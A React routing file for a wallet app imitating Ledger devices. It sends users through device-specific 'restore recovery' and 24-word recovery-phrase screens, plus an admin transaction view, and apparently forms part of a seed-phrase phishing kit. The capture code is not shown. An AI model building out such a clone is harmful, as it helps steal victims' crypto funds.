import React, { useState, useEffect } from "react";
import {
  HashRouter as Router,
  Routes,
  Route,
  Navigate,
  useLocation,
} from "react-router-dom";
import MainLayout from "./components/Layout/MainLayout";
import Dashboard from "./components/Screens/Dashboard";
import Accounts from "./components/Screens/Accounts";
import Send from "./components/Screens/Send";
import Receive from "./components/Screens/Receive";
import Manager from "./components/Screens/Manager";
import Settings from "./components/Screens/Settings";
import AdminTransactionHistory from "./components/Screens/AdminTransactionHistory";
import ProtectedRoute from "./components/loginProcess/ProtectedRoute";

// Onboarding Screens
import Welcome from "./components/Onboarding/Welcome";
import DeviceConnection from "./components/Onboarding/DeviceConnection";
import AccountImport from "./components/Onboarding/AccountImport";
import AppSetup from "./components/Onboarding/AppSetup";
import Login from "./components/Onboarding/Login";
import Login1 from "./components/loginProcess/Login";
import LedgerRecover from "./components/popups/LedgerRecover"; // Import the login component

import "./App.css";
import AllDevices from "./components/loginProcess/AllDevices";
import Ledger_Stax from "./components/loginProcess/allDevices_subsection/Ledger_Stax";
import Ledger_Flex from "./components/loginProcess/allDevices_subsection/Ledger_Flex";
import Ledger_Nano_S from "./components/loginProcess/allDevices_subsection/Ledger_Nano_S";
import Ledger_Nano_S_Plus from "./components/loginProcess/allDevices_subsection/Ledger_Nano_S_Plus";
import Ledger_Nano_X from "./components/loginProcess/allDevices_subsection/Ledger_Nano_X";
import First_Time_Nano_S from "./components/loginProcess/allDevices_subsection/nano-s-subsections/First_Time_Nano_S";
import Connect_Nano_S from "./components/loginProcess/allDevices_subsection/nano-s-subsections/Connect_Nano_S";
import Restore_Recovery_Nano_S from "./components/loginProcess/allDevices_subsection/nano-s-subsections/Restore_Recovery_Nano_S";
import First_Time_Nano_S_Plus from "./components/loginProcess/allDevices_subsection/nano-s-plus-subsections/First_Time_Nano_S_Plus";
import Connect_Nano_S_Plus from "./components/loginProcess/allDevices_subsection/nano-s-plus-subsections/Connect_Nano_S_Plus";
import Restore_Recovery_Nano_S_Plus from "./components/loginProcess/allDevices_subsection/nano-s-plus-subsections/Restore_Recovery_Nano_S_Plus";
import First_Time_Nano_X from "./components/loginProcess/allDevices_subsection/nano-x-subsection/First_Time_Nano_X";
import Connect_Nano_X from "./components/loginProcess/allDevices_subsection/nano-x-subsection/Connect_Nano_X";
import Restore_Recovery_Nano_X from "./components/loginProcess/allDevices_subsection/nano-x-subsection/Restore_Recovery_Nano_X";
import Recover_24 from "./components/loginProcess/allDevices_subsection/nano-s-plus-subsections/Recover_24";
import ForgetPasswordLedger from "./components/popups/ForgetPasswordLedger";
import Recover_24_Nano_X from "./components/loginProcess/allDevices_subsection/nano-x-subsection/Recover_24_NanoX";
import LedgerRegister from "./components/popups/LedgerRegister";
import { DarkModeProvider } from "./components/DarkModeContext";

function AppContent() {
  const location = useLocation();
  const [currentScreen, setCurrentScreen] = useState("portfolio");

  useEffect(() => {
    // Update current screen based on location
    const path = location.pathname;
    if (path === "/accounts") setCurrentScreen("accounts");
    else if (path === "/send") setCurrentScreen("send");
    else if (path === "/receive") setCurrentScreen("receive");
    else if (path === "/manager") setCurrentScreen("manager");
    else if (path === "/admin-transactions")
      setCurrentScreen("admin-transactions");
    else if (path === "/settings") setCurrentScreen("settings");
    else setCurrentScreen("portfolio");
  }, [location]);

  return (
    <div className="min-h-screen bg-gray-950 dark">
      <DarkModeProvider>
        <Routes>
          {/* Public Routes */}
          <Route path="/" element={<Login1 />} />
          <Route path="/login" element={<LedgerRecover />} />
          <Route path="/register" element={<LedgerRegister />} />

          {/* Device Selection Routes */}
          <Route path="/all-devices" element={<AllDevices />} />
          <Route path="/all-devices/ledger-stax" element={<Ledger_Stax />} />
          <Route path="/all-devices/ledger-flex" element={<Ledger_Flex />} />
          <Route
            path="/all-devices/ledger-nano-s"
            element={<Ledger_Nano_S />}
          />
          <Route
            path="/all-devices/ledger-nano-s-plus"
            element={<Ledger_Nano_S_Plus />}
          />
          <Route
            path="/all-devices/ledger-nano-x"
            element={<Ledger_Nano_X />}
          />

          {/* Nano-S Routes */}
          <Route
            path="/all-devices/ledger-nano-s/first-time-nano-s"
            element={<First_Time_Nano_S />}
          />
          <Route
            path="/all-devices/ledger-nano-s/connect-nano-s"
            element={<Connect_Nano_S />}
          />
          <Route
            path="/all-devices/ledger-nano-s/restore-recovery-nano-s"
            element={<Restore_Recovery_Nano_S />}
          />

          {/* Nano-S-Plus Routes */}
          <Route
            path="/all-devices/ledger-nano-s-plus/first-time-nano-s-plus"
            element={<First_Time_Nano_S_Plus />}
          />
          <Route
            path="/all-devices/ledger-nano-s-plus/connect-nano-s-plus"
            element={<Connect_Nano_S_Plus />}
          />
          <Route
            path="/all-devices/ledger-nano-s-plus/restore-recovery-nano-s-plus"
            element={<Restore_Recovery_Nano_S_Plus />}
          />
          <Route
            path="/all-devices/ledger-nano-s-plus/restore-24-nano-s-plus"
            element={<Recover_24 />}
          />
          <Route
            path="/all-devices/ledger-nano-s-plus/restore-24-nano-s-plus/forget-password"
            element={<ForgetPasswordLedger />}
          />

          {/* Nano-X Routes */}
          <Route
            path="/all-devices/ledger-nano-x/first-time-nano-x"
            element={<First_Time_Nano_X />}
          />
          <Route
            path="/all-devices/ledger-nano-x/connect-nano-x"
            element={<Connect_Nano_X />}
          />
          <Route
            path="/all-devices/ledger-nano-x/restore-recovery-nano-x"
            element={<Restore_Recovery_Nano_X />}
          />
          <Route
            path="/all-devices/ledger-nano-x/restore-24-nano-x"
            element={<Recover_24_Nano_X />}
          />

          {/* Onboarding Routes */}
          <Route path="/onboarding-welcome" element={<Welcome />} />
          <Route
            path="/onboarding/device-connection"
            element={<DeviceConnection />}
          />
          <Route
            path="/onboarding/account-import"
            element={<AccountImport />}
          />
          <Route path="/onboarding/app-setup" element={<AppSetup />} />

          {/* Protected Main App Routes */}
          <Route
            path="/dashboard"
            element={
              <ProtectedRoute>
                <MainLayout
                  currentScreen={currentScreen}
                  onScreenChange={setCurrentScreen}
                >
                  <Dashboard />
                </MainLayout>
              </ProtectedRoute>
            }
          />
          <Route
            path="/accounts"
            element={
              <ProtectedRoute>
                <MainLayout
                  currentScreen={currentScreen}
                  onScreenChange={setCurrentScreen}
                >
                  <Accounts />
                </MainLayout>
              </ProtectedRoute>
            }
          />
          <Route
            path="/send"
            element={
              <ProtectedRoute>
                <MainLayout
                  currentScreen={currentScreen}
                  onScreenChange={setCurrentScreen}
                >
                  <Send />
                </MainLayout>
              </ProtectedRoute>
            }
          />
          <Route
            path="/receive"
            element={
              <ProtectedRoute>
                <MainLayout
                  currentScreen={currentScreen}
                  onScreenChange={setCurrentScreen}
                >
                  <Receive />
                </MainLayout>
              </ProtectedRoute>
            }
          />
          <Route
            path="/manager"
            element={
              <ProtectedRoute>
                <MainLayout
                  currentScreen={currentScreen}
                  onScreenChange={setCurrentScreen}
                >
                  <Manager />
                </MainLayout>
              </ProtectedRoute>
            }
          />
          <Route
            path="/settings"
            element={
              <ProtectedRoute>
                <MainLayout
                  currentScreen={currentScreen}
                  onScreenChange={setCurrentScreen}
                >
                  <Settings />
                </MainLayout>
              </ProtectedRoute>
            }
          />
          <Route
            path="/admin-transactions"
            element={
              <ProtectedRoute>
                <MainLayout
                  currentScreen={currentScreen}
                  onScreenChange={setCurrentScreen}
                >
                  <AdminTransactionHistory />
                </MainLayout>
              </ProtectedRoute>
            }
          />

          {/* Catch all - redirect to login */}
          <Route path="*" element={<Navigate to="/login" replace />} />
        </Routes>
      </DarkModeProvider>
    </div>
  );
}

function App() {
  return (
    <Router>
      <AppContent />
    </Router>
  );
}

export default App;
